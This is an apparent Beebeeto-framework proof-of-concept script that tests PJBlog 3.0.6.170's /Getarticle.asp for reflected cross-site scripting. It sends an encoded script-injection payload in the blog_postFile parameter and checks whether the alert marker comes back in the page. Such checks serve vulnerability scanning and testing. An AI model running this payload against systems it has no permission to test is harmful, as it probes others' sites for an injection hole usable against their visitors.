#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0187',
            'name': 'PJBlog 3.0.6.170 /Getarticle.asp XSS漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PJBlog',
            'vul_version': ['3.0.6.170'],
            'type': 'Cross Site Scripting',
            'tag': ['PJBlog漏洞', 'xss漏洞', '/Getarticle.asp','asp'],
            'desc': '漏洞文件：Getarticle.asp',
            'references': ['http://sebug.net/vuldb/ssvid-11237',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/Getarticle.asp?id=1&blog_postFile=x%22%20)></a>%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E&page=2'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert("bb2")</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
        
    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())